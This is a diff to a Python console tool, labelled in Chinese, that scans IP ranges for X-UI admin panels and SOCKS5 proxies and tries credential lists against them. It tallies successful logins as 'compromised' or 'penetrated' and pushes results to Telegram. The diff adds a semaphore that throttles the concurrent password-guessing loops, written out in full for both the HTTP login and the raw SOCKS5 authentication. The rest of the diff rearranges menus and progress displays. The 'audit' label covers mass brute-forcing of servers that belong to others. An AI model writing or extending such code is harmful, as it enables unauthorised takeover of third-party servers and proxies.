@@ -834,6 +834,13 @@ def poll_zero_to_back(timeout_sec=0.5):
     return raw == "0"
 
 
+def wait_for_zero_return(prompt="输入 0 返回主菜单: "):
+    while True:
+        if input(prompt).strip() == "0":
+            return
+        print("请输入 0 返回。")
+
+
 def get_available_memory_mb():
     if os.name == "nt":
 
@@ -1111,7 +1118,16 @@ def run_guardian(
 # ==================== 审计核心 (逻辑不变，输出格式显密) ====================
 
 
-async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
+async def audit_xui(
+    ip,
+    port,
+    tokens,
+    state,
+    state_lock,
+    work_mode,
+    conn_limiter,
+    token_sem=None,
+):
     async def fetch_page(path, use_ssl=False, method="GET", payload=""):
         writer = None
         try:
@@ -1207,9 +1223,18 @@ async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter
             for proto, use_ssl, country, asn, login_path in found_candidates:
                 for u, p in tokens:
                     payload = f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
-                    login_resp = await fetch_page(
-                        login_path, use_ssl=use_ssl, method="POST", payload=payload
-                    )
+                    if token_sem is not None:
+                        async with token_sem:
+                            login_resp = await fetch_page(
+                                login_path,
+                                use_ssl=use_ssl,
+                                method="POST",
+                                payload=payload,
+                            )
+                    else:
+                        login_resp = await fetch_page(
+                            login_path, use_ssl=use_ssl, method="POST", payload=payload
+                        )
                     if check_auth_success(login_resp):
                         async with state_lock:
                             state["xui_verified"] += 1
@@ -1228,7 +1253,16 @@ async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter
     return None
 
 
-async def audit_socks5(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
+async def audit_socks5(
+    ip,
+    port,
+    tokens,
+    state,
+    state_lock,
+    work_mode,
+    conn_limiter,
+    token_sem=None,
+):
     async def check_l7(reader, writer):
         try:
             req = b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.68.0\r\nConnection: close\r\n\r\n"
@@ -1298,22 +1332,41 @@ async def audit_socks5(ip, port, tokens, state, state_lock, work_mode, conn_limi
                 for u, p in tokens:
                     w3 = None
                     try:
-                        async with conn_limiter:
-                            r3, w3 = await asyncio.wait_for(
-                                asyncio.open_connection(ip, port), timeout=2.0
+                        if token_sem is not None:
+                            async with token_sem:
+                                async with conn_limiter:
+                                    r3, w3 = await asyncio.wait_for(
+                                        asyncio.open_connection(ip, port), timeout=2.0
+                                    )
+                                w3.write(b"\x05\x01\x02")
+                                await w3.drain()
+                                await r3.read(2)
+                                w3.write(
+                                    b"\x01"
+                                    + bytes([len(u)])
+                                    + u.encode()
+                                    + bytes([len(p)])
+                                    + p.encode()
+                                )
+                                await w3.drain()
+                                auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
+                        else:
+                            async with conn_limiter:
+                                r3, w3 = await asyncio.wait_for(
+                                    asyncio.open_connection(ip, port), timeout=2.0
+                                )
+                            w3.write(b"\x05\x01\x02")
+                            await w3.drain()
+                            await r3.read(2)
+                            w3.write(
+                                b"\x01"
+                                + bytes([len(u)])
+                                + u.encode()
+                                + bytes([len(p)])
+                                + p.encode()
                             )
-                        w3.write(b"\x05\x01\x02")
-                        await w3.drain()
-                        await r3.read(2)
-                        w3.write(
-                            b"\x01"
-                            + bytes([len(u)])
-                            + u.encode()
-                            + bytes([len(p)])
-                            + p.encode()
-                        )
-                        await w3.drain()
-                        auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
+                            await w3.drain()
+                            auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
                         if auth and len(auth) >= 2 and auth[1] == 0x00:
                             start = time.perf_counter()
                             w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
@@ -1413,6 +1466,7 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
     notify_tasks = set()
 
     q = asyncio.Queue(maxsize=max(threads * 4, 4096))
+    token_sem = asyncio.Semaphore(max(1, threads // 2))
     adaptive_min = min(ADAPT_MIN_CONCURRENCY, max(10, threads))
     adaptive_max = max(adaptive_min, min(threads, ADAPT_MAX_CONCURRENCY))
     socket_limit = max(50, min(MAX_SOCKET_CONCURRENCY, adaptive_max))
@@ -1601,6 +1655,7 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
                             state_lock,
                             work_mode,
                             conn_limiter,
+                            token_sem,
                         )
                         if x_r:
                             await handle_found_results([x_r])
@@ -1616,6 +1671,7 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
                             state_lock,
                             work_mode,
                             conn_limiter,
+                            token_sem,
                         )
                         if s_r:
                             await handle_found_results([s_r])
@@ -1831,8 +1887,8 @@ def main_console():
         total = int(s.get("total", 0))
         fed = int(s.get("fed", 0))
         feed_total = int(s.get("feed_total", 0))
-        main_bar = render_progress_bar(done, total, width=24)
-        progress_ratio = (done / total) if total > 0 else 0.0
+        main_bar = render_progress_bar(fed, feed_total, width=24)
+        progress_ratio = (fed / feed_total) if feed_total > 0 else 0.0
         progress_pct = progress_ratio * 100.0
         ip_bar_width = 24
         ip_bar_fill = int(ip_bar_width * max(0.0, min(1.0, progress_ratio)))
@@ -1891,10 +1947,10 @@ def main_console():
         )
         print(
             panel_line(
-                f"{C_W}当前IP:{C_CYAN}{done}{C_W}/{total} ({C_CYAN}{progress_pct:5.1f}%{C_W}) [{C_PROC}{ip_bar}{C_W}]"
+                f"{C_W}当前喂入IP:{C_CYAN}{fed}{C_W}/{feed_total} ({C_CYAN}{progress_pct:5.1f}%{C_W}) [{C_PROC}{ip_bar}{C_W}]"
             )
         )
-        print(panel_line(f"{C_W}进度条:{main_bar}"))
+        print(panel_line(f"{C_W}喂入进度条:{main_bar}"))
         print(
             panel_line(
                 f"{C_W}XUI 已审计:{C_CYAN}{xui_audited}{C_W} / 已验真:{C_WARN}{xui_verified}{C_W} {panel_border}| {C_W}S5 已审计:{C_CYAN}{s5_audited}{C_W} / 已验真:{C_SUCC}{s5_verified}{C_W} {panel_border}| {C_W}验证中:{C_CYAN}{verifying_now}"
@@ -1911,13 +1967,11 @@ def main_console():
         )
 
         print(f"\n{C_CYAN} [ 核心指令 ]{C_W}")
-        print(f" 1) 启动审计  5) 停止审计  9) 退出系统")
-        print(f" 2) 监控面板  6) 启动守护")
-        print(f" 3) X-UI审计/验真  10) Telegram推送")
-        print(f" 4) 查看日志  8) 停止守护")
-        print(f" 7) 断点续连  11) S5审计/验真")
-        print(f" 12) 进料加速策略")
-        print(f" 13) 清空审计结果  14) 清空审计结果")
+        print(f" 1) 启动审计           2) 监控面板           3) X-UI审计/验真")
+        print(f" 4) 查看日志           5) 停止审计           6) 启动守护")
+        print(f" 7) 断点续连           8) 停止守护           9) 退出系统")
+        print(f"10) Telegram推送      11) S5审计/验真      12) 进料加速策略")
+        print(f"13) 清空审计结果      14) 清空审计结果")
 
         try:
             c = timed_input(
@@ -1977,50 +2031,46 @@ def main_console():
             time.sleep(1)
 
         elif c == "2":
-            try:
-                while True:
-                    st = load_state(STATE_FILE)
-                    done = st.get("done", 0)
-                    total = st.get("total", 0)
-                    bar = render_progress_bar(done, total)
-                    spin_char = spinner[spin_idx % len(spinner)]
-                    spin_idx += 1
+            while True:
+                st = load_state(STATE_FILE)
+                done = st.get("done", 0)
+                total = st.get("total", 0)
+                bar = render_progress_bar(done, total)
+                spin_char = spinner[spin_idx % len(spinner)]
+                spin_idx += 1
 
-                    os.system("cls" if os.name == "nt" else "clear")
-                    # 极光监控仪表盘
-                    print(
-                        f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┃ {C_W}{spin_char} {C_BOLD}REAL-TIME MONITOR{C_W}       | {C_DIM}Mode: {work_mode_label(st.get('work_mode', 2))}{C_BLUE}       ┃{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
-                    )
-                    # XUI 行 (去除高光，统一对齐)
-                    print(
-                        f"{C_BLUE}┃ {C_W}X-UI 面板  {C_BLUE}|{C_W} 发现: {C_CYAN}{st.get('xui_found', 0):<6}{C_W} | 沦陷: {C_WARN}{st.get('xui_verified', 0):<6}{C_BLUE} ┃{C_W}"
-                    )
-                    # S5 行 (去除高光，统一对齐)
-                    print(
-                        f"{C_BLUE}┃ {C_W}SOCKS5代理 {C_BLUE}|{C_W} 连通: {C_CYAN}{st.get('s5_found', 0):<6}{C_W} | 穿透: {C_SUCC}{st.get('s5_verified', 0):<6}{C_BLUE} ┃{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┃ {C_W}当前动作   {C_BLUE}|{C_DIM} {st.get('current', '-')[:24]:<24} 并行:{st.get('active_workers', 0):<4} {C_BLUE}┃{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┃ {C_W}总体进度   {C_BLUE}|{C_W} {bar} {C_BLUE}┃{C_W}"
-                    )
-                    print(
-                        f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
-                    )
-                    print(f"\n{C_DIM}按 Ctrl+C 返回主菜单...{C_W}")
-                    time.sleep(0.5)
-            except KeyboardInterrupt:
-                pass
+                os.system("cls" if os.name == "nt" else "clear")
+                # 极光监控仪表盘
+                print(
+                    f"{C_BLUE}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C_W}"
+                )
+                print(
+                    f"{C_BLUE}┃ {C_W}{spin_char} {C_BOLD}REAL-TIME MONITOR{C_W}       | {C_DIM}Mode: {work_mode_label(st.get('work_mode', 2))}{C_BLUE}       ┃{C_W}"
+                )
+                print(
+                    f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
+                )
+                # XUI 行 (去除高光，统一对齐)
+                print(
+                    f"{C_BLUE}┃ {C_W}X-UI 面板  {C_BLUE}|{C_W} 发现: {C_CYAN}{st.get('xui_found', 0):<6}{C_W} | 沦陷: {C_WARN}{st.get('xui_verified', 0):<6}{C_BLUE} ┃{C_W}"
+                )
+                # S5 行 (去除高光，统一对齐)
+                print(
+                    f"{C_BLUE}┃ {C_W}SOCKS5代理 {C_BLUE}|{C_W} 连通: {C_CYAN}{st.get('s5_found', 0):<6}{C_W} | 穿透: {C_SUCC}{st.get('s5_verified', 0):<6}{C_BLUE} ┃{C_W}"
+                )
+                print(
+                    f"{C_BLUE}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{C_W}"
+                )
+                print(
+                    f"{C_BLUE}┃ {C_W}当前动作   {C_BLUE}|{C_DIM} {st.get('current', '-')[:24]:<24} 并行:{st.get('active_workers', 0):<4} {C_BLUE}┃{C_W}"
+                )
+                print(f"{C_BLUE}┃ {C_W}总体进度   {C_BLUE}|{C_W} {bar} {C_BLUE}┃{C_W}")
+                print(
+                    f"{C_BLUE}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C_W}"
+                )
+                print(f"\n{C_DIM}输入 0 返回主菜单...{C_W}")
+                if poll_zero_to_back(0.5):
+                    break
 
         elif c == "3":
             try:
@@ -2070,7 +2120,7 @@ def main_console():
             output = read_last_lines(LOG_FILE, lines=50)
             print(f"\n{C_CYAN}>>> 系统日志{C_W}\n")
             print(output if output else f"{C_DIM}暂无日志{C_W}")
-            input(f"\n{C_BLUE}按回车返回...{C_W}")
+            wait_for_zero_return(f"\n{C_BLUE}输入 0 返回...{C_W}")
 
         elif c == "5":
             pid = load_state(STATE_FILE).get("pid")
